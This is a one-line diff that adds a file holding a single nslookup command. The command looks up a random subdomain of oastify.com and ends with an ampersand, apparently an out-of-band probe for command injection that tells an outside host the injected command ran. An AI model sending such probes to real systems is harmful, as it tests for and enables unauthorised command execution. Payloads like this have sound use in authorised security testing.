@@ -1,0 +1,1 @@
+nslookup -q=cname eew4lnt0fcx50afd4en58vmm9df6316pzsnkady2.oastify.com.&
